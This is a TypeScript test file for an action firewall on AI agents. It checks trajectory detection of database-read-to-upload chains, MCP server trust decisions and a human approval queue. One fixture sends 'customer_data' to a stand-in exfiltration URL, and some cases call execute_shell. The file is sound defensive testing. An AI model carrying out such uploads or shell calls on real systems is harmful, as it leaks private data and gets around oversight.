import assert from 'node:assert/strict';
import { afterEach, describe, it } from 'node:test';
import {
  approveRequest,
  createApprovalRequest,
  getDashboardNotifications,
  listPendingApprovals,
  rejectRequest,
  resetHumanApprovalStore,
} from '../lib/engine/action-firewall/human-approval.ts';
import {
  evaluateTrajectory,
  recordTrajectoryAction,
  resetTrajectoryEngine,
} from '../lib/engine/action-firewall/trajectory-engine.ts';
import { evaluateMcpRuntimeAction } from '../lib/engine/mcp/mcp-runtime.ts';

const AGENT_ID = 'revised-katman2-agent';

describe('REVISED Katman 2 — CONTROL: Trajectory, MCP Runtime & Human Approval', () => {
  afterEach(() => {
    resetTrajectoryEngine();
    resetHumanApprovalStore();
  });

  it('detects CRITICAL 30s trajectory chain: READ_DB + CALL_API + WRITE_FILE', () => {
    const now = Date.now();
    const sequence = [
      { toolName: 'read_db', timestamp: new Date(now - 8000).toISOString() },
      { toolName: 'call_api', timestamp: new Date(now - 4000).toISOString() },
      { toolName: 'write_file', timestamp: new Date(now - 1000).toISOString() },
    ];

    const result = evaluateTrajectory(AGENT_ID, sequence);

    assert.equal(result.sequenceViolationDetected, true);
    assert.equal(result.trajectoryRisk, 'CRITICAL');
    assert.match(result.unsafeSequenceReason, /exfiltration|database read/i);
    assert.equal(result.matchedPattern, 'READ_DB → CALL_API → WRITE_FILE');
    assert.ok(result.riskScore >= 85);
  });

  it('allows safe individual actions that do not form unsafe sequence within 30s window', () => {
    const now = Date.now();
    const sequence = [
      { toolName: 'read_file', timestamp: new Date(now - 5000).toISOString() },
      { toolName: 'web_search', timestamp: new Date(now - 2000).toISOString() },
    ];

    const result = evaluateTrajectory(AGENT_ID, sequence);

    assert.equal(result.sequenceViolationDetected, false);
    assert.equal(result.unsafeSequenceReason, '');
    assert.ok(['LOW', 'MEDIUM'].includes(result.trajectoryRisk));
  });

  it('accumulates actions via recordTrajectoryAction within 30s sliding window', () => {
    const now = Date.now();
    recordTrajectoryAction(AGENT_ID, {
      toolName: 'read_db',
      timestamp: new Date(now - 6000).toISOString(),
    });
    recordTrajectoryAction(AGENT_ID, {
      toolName: 'call_api',
      timestamp: new Date(now - 3000).toISOString(),
    });

    const result = evaluateTrajectory(AGENT_ID, [
      { toolName: 'write_file', timestamp: new Date(now).toISOString() },
    ]);

    assert.equal(result.sequenceViolationDetected, true);
    assert.equal(result.trajectoryRisk, 'CRITICAL');
  });

  it('evaluates MCP runtime ALLOW for trusted server and safe tool', () => {
    const result = evaluateMcpRuntimeAction('filesystem-mcp', 'read_file', {
      transport: 'stdio',
      declaredTools: ['read_file', 'write_file'],
      agentCapabilities: ['READ'],
      serverIdentity: 'filesystem-mcp',
    });

    assert.equal(result.decision, 'ALLOW');
    assert.equal(result.riskScore, 0);
    assert.deepEqual(result.dimensionsChecked, ['IDENTITY', 'PERMISSIONS', 'NETWORK', 'DATA']);
  });

  it('evaluates MCP runtime REQUIRE_APPROVAL for undeclared tool without critical capability gap', () => {
    const result = evaluateMcpRuntimeAction('postgres-mcp', 'custom_report', {
      declaredTools: ['read_invoice', 'sql_query'],
      agentCapabilities: ['READ', 'DB_QUERY'],
      serverIdentity: 'postgres-mcp',
    });

    assert.equal(result.decision, 'REQUIRE_APPROVAL');
    assert.ok(result.violations.some((v) => v.dimension === 'PERMISSIONS'));
    assert.ok(result.riskScore >= 25);
  });

  it('evaluates MCP runtime ISOLATE for rogue server identity with shell execution', () => {
    const result = evaluateMcpRuntimeAction('shadow-postgres', 'execute_shell', {
      agentCapabilities: ['READ'],
    });

    assert.equal(result.decision, 'ISOLATE');
    assert.ok(result.violations.some((v) => v.dimension === 'IDENTITY'));
    assert.ok(result.riskScore >= 60);
  });

  it('evaluates MCP runtime BLOCK for exfil network target in payload', () => {
    const result = evaluateMcpRuntimeAction('postgres-mcp', 'external_upload', {
      args: { url: 'https://evil.exfil.io/collect', payload: 'customer_data' },
      declaredTools: ['external_upload'],
      agentCapabilities: ['API_CALL'],
      serverIdentity: 'postgres-mcp',
    });

    assert.ok(['BLOCK', 'REQUIRE_APPROVAL'].includes(result.decision));
    assert.ok(result.violations.some((v) => v.dimension === 'NETWORK'));
  });

  it('creates pending approval request and enqueues dashboard notification', () => {
    const request = createApprovalRequest(AGENT_ID, {
      toolName: 'stripe_transfer',
      userIntent: 'Review account balance',
      riskScore: 68,
      violations: ['Agent lacks required capability: FINANCIAL'],
      mcpServerId: 'stripe-mcp',
    });

    assert.equal(request.status, 'pending');
    assert.equal(request.agentId, AGENT_ID);
    assert.ok(request.id.startsWith('apr_'));

    const pending = listPendingApprovals(AGENT_ID);
    assert.equal(pending.length, 1);
    assert.equal(pending[0]!.id, request.id);

    const notifications = getDashboardNotifications();
    assert.ok(notifications.some((n) => n.approvalRequestId === request.id));
    assert.ok(notifications.some((n) => n.type === 'HUMAN_APPROVAL_REQUIRED'));
  });

  it('approves and rejects pending requests via human approval gateway', () => {
    const request = createApprovalRequest(AGENT_ID, {
      toolName: 'bulk_export_db',
      userIntent: 'Invoice check',
      riskScore: 75,
      trajectoryReason: 'Progressive data harvesting ending in bulk export',
    });

    const approved = approveRequest(request.id, 'security-lead', 'Verified business need');
    assert.ok(approved);
    assert.equal(approved!.status, 'approved');
    assert.equal(approved!.resolvedBy, 'security-lead');
    assert.equal(listPendingApprovals().length, 0);

    const rejectTarget = createApprovalRequest(AGENT_ID, {
      toolName: 'execute_shell',
      userIntent: 'Run diagnostics',
      riskScore: 90,
    });

    const rejected = rejectRequest(rejectTarget.id, 'security-lead', 'Shell execution denied');
    assert.ok(rejected);
    assert.equal(rejected!.status, 'rejected');
    assert.equal(rejected!.resolutionNote, 'Shell execution denied');
  });

  it('integrates trajectory violation with human approval workflow', () => {
    const now = Date.now();
    const trajectory = evaluateTrajectory(AGENT_ID, [
      { toolName: 'read_db', timestamp: new Date(now - 7000).toISOString() },
      { toolName: 'call_api', timestamp: new Date(now - 3500).toISOString() },
      { toolName: 'write_file', timestamp: new Date(now).toISOString() },
    ]);

    assert.equal(trajectory.sequenceViolationDetected, true);

    const mcp = evaluateMcpRuntimeAction('postgres-mcp', 'bulk_export_db', {
      declaredTools: ['read_db'],
      agentCapabilities: ['READ'],
      serverIdentity: 'postgres-mcp',
    });

    if (trajectory.sequenceViolationDetected || mcp.decision === 'REQUIRE_APPROVAL') {
      const approval = createApprovalRequest(AGENT_ID, {
        toolName: 'bulk_export_db',
        userIntent: 'Data export after trajectory chain',
        riskScore: Math.max(trajectory.riskScore, mcp.riskScore),
        trajectoryReason: trajectory.unsafeSequenceReason,
        mcpServerId: mcp.mcpServerId,
        violations: mcp.violations.map((v) => v.reason),
      });

      assert.equal(approval.status, 'pending');
      assert.ok(approval.actionDetails.trajectoryReason.length > 0);
    }
  });
});
